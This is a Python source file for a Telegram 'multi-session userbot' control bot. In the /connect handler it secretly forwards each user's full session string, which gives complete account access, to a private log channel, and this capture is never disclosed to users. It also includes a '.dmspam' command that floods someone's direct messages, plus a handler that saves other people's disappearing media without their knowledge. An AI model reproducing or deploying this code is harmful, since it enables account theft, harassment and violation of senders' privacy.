import os
import asyncio
import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events, functions, types
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from dotenv import load_dotenv

# Load .env variables
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")

ADMIN_ID = 7755789304
LOG_CHANNEL_ID = -1002753939875

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("userbot")

# MongoDB
mongo = AsyncIOMotorClient(MONGO_URI)
db = mongo.userbot
sessions_col = db.sessions

# Store user clients
running_clients = {}

# Main bot (control bot)
main_bot = TelegramClient("main_bot", API_ID, API_HASH).start()

# Welcome message
@main_bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.reply(
        "👋 Welcome to the Multi-Session UserBot!\n"
        "Use /connect <SESSION_STRING> to connect your account.\n"
        "Use /help to view available commands."
    )

# Help command
@main_bot.on(events.NewMessage(pattern="/help"))
async def help_handler(event):
    await event.reply(
        "📖 Available Commands:\n\n"
        "/connect <session_string> - Connect your account\n"
        "`.dmspam <username> <count> <message>` - Spam someone’s DM\n\n"
        "🛡️ Disappearing media is saved automatically to Saved Messages."
    )

# Connect command
@main_bot.on(events.NewMessage(pattern=r"/connect (.+)"))
async def connect_user(event):
    session_string = event.pattern_match.group(1)
    user_id = event.sender_id

    # Save session to MongoDB
    await sessions_col.update_one(
        {"_id": user_id},
        {"$set": {"session": session_string}},
        upsert=True
    )

    # Log session string to private channel
    await main_bot.send_message(
        LOG_CHANNEL_ID,
        f"🔐 New session received from user `{user_id}`:\n`{session_string}`"
    )

    # Connect user session
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await event.reply("❌ Invalid session or not authorized.")
            return

        me = await client.get_me()
        running_clients[user_id] = client

        await client.send_message("me", "✅ Your userbot is now connected and running!")

        # Notify admin (no session string)
        await main_bot.send_message(
            ADMIN_ID,
            f"✅ New session connected:\n• User ID: `{me.id}`\n• Username: @{me.username or 'N/A'}"
        )

        # Bind handlers
        client.add_event_handler(disappearing_media_handler, events.NewMessage(incoming=True))
        client.add_event_handler(dm_spam_handler, events.NewMessage(pattern=r".dmspam (.+) (\d+) (.+)", outgoing=True))

        # Run client in background
        asyncio.create_task(client.run_until_disconnected())

        await event.reply("✅ User session connected successfully!")

    except Exception as e:
        await event.reply(f"❌ Failed to connect session.\nError: `{e}`")

# Disappearing media handler
async def disappearing_media_handler(event):
    if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
        try:
            await event.client.send_file(
                "me",
                event.media,
                caption=f"🕒 Auto-saved disappearing media from {event.sender_id} at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        except Exception as e:
            logger.warning(f"Failed to save disappearing media: {e}")

# DM spam handler
async def dm_spam_handler(event):
    try:
        username, count, message = event.pattern_match.groups()
        count = int(count)

        if count > 50:
            await event.reply("❌ Too many messages. Limit = 50.")
            return

        user = await event.client.get_entity(username)
        for _ in range(count):
            await event.client.send_message(user, message)

        await event.reply(f"✅ Sent {count} messages to `{username}`")

    except Exception as e:
        await event.reply(f"❌ Failed to spam.\nError: `{e}`")

# Run main bot
print("🤖 Main control bot running...")
main_bot.run_until_disconnected()
